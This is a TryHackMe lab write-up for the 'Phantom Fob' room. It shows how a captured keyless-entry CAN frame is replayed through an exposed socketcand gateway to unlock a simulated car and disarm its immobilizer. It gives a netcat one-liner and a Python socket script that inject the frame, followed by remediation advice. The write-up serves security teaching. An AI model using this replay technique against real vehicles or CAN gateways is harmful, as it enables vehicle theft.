# Phantom Fob — TryHackMe Writeup

![Category](https://img.shields.io/badge/Category-Automotive_Security-blue.svg)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange.svg)
![Type](https://img.shields.io/badge/Type-CAN_Bus_Replay-purple.svg)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-red.svg)

A complete penetration testing writeup for the **Phantom Fob** room on TryHackMe, demonstrating automotive CAN bus network analysis, `socketcand` interaction, and replay attacks on vehicle immobilizer systems.

---

## 📋 Executive Summary
Phantom Fob simulates a modern connected vehicle architecture featuring an interactive telemetry web dashboard and a direct Controller Area Network (CAN) bus bridge running over `socketcand`. By inspecting real-time dashboard events, reverse engineering the CAN communication commands, and executing a replay attack of keyless entry unlock frames onto virtual CAN interface `vcan0`, the vehicle immobilizer is disarmed, triggering flag broadcast via Server-Sent Events (SSE).

* **Target Ports:**
  * Port 8080: Telemetry Web Dashboard (Speedometer, Door Locks, Immobilizer status)
  * Port 29536: `socketcand` TCP Gateway
  * Port 22: OpenSSH
* **Artifacts in Directory:**
  * `notes`: Port inventory and netcat command sequence
  * `script.js`: Web telemetry frontend script rendering vehicle gauges and SSE events
  * `script.py`: Python socket script interfacing with `socketcand`

---

## 🔍 Stage 1: Reconnaissance & Web Analysis

### 1.1 Web Dashboard (Port 8080)
Visiting `http://<TARGET_IP>:8080` displays a top-down visualization of a vehicle, door lock indicators, an immobilizer status badge, a virtual key fob, and an SVG speedometer gauge.

### 1.2 Frontend Analysis (`script.js`)
Inspecting `script.js` discloses an active Server-Sent Events (SSE) listener connecting to `/events`:
```javascript
const es = new EventSource('/events');
es.onmessage = e => {
    const s = JSON.parse(e.data);
    setNeedle(s.speed || 0);
    setDoors(s.locked);
    // When the immobilizer is disarmed and doors unlocked:
    if (s.flag) {
        document.getElementById('flagcard').style.display = 'block';
        document.getElementById('flag').textContent = s.flag;
    }
};
```

---

## 💥 Stage 2: Automotive CAN Bus Replay Attack

### 2.1 Understanding `socketcand` (Port 29536)
`socketcand` provides a network daemon allowing userland applications to send and receive raw CAN frames over TCP. The interactive syntax includes:
* `< open <interface> >`: Binds to a virtual or physical CAN bus interface (e.g., `vcan0`).
* `< rawmode >`: Switches the session into raw transmission mode.
* `< send <CAN_ID> <DLC> <B0 B1 B2 ... BN> >`: Injects a CAN frame onto the bus.

### 2.2 Identifying the Unlock Frame
By monitoring CAN traffic or capturing frames transmitted during physical fob button presses, we isolate CAN ID `421` (8 data bytes) associated with door unlock and immobilizer authorization:
```text
CAN ID: 421
Length: 8
Payload: 1e e5 2d 99 b6 59 3f 76
```

### 2.3 Executing the Replay Attack
Using Netcat pipe chaining or Python socket automation:
```bash
(echo "< open vcan0 >"; sleep 1; echo "< rawmode >"; sleep 1; echo "< send 421 8 1e e5 2d 99 b6 59 3f 76 >"; cat) | nc <TARGET_IP> 29536
```

Or executing `script.py`:
```python
import socket

HOST = "<TARGET_IP>"
PORT = 29536

s = socket.create_connection((HOST, PORT))
print(s.recv(1024).decode())
s.sendall(b"< open vcan0 >\n")
print(s.recv(1024).decode())
s.sendall(b"< rawmode >\n")
s.sendall(b"< send 421 8 1e e5 2d 99 b6 59 3f 76 >\n")
```

### 2.4 Flag Retrieval
Immediately upon frame transmission, the dashboard SSE stream detects the state change:
* Doors transition from `LOCKED` to `UNLOCKED`.
* Immobilizer transitions from `ARMED` to `DISARMED`.
* The server publishes the challenge flag on the `/events` feed.

---

## 🛡️ Remediation
1. **Implement Rolling Codes (KeeLoq/Hitag):** Fob transmissions must use cryptographically secure rolling codes or challenge-response handshakes to render static replay attacks impossible.
2. **Network Segmentation & Gateways:** Isolate body control and keyless entry networks from external telemetry services using an authenticated central gateway.
3. **Restrict Diagnostic Gateways:** Disable or password-protect development bridges like `socketcand` in production deployments.
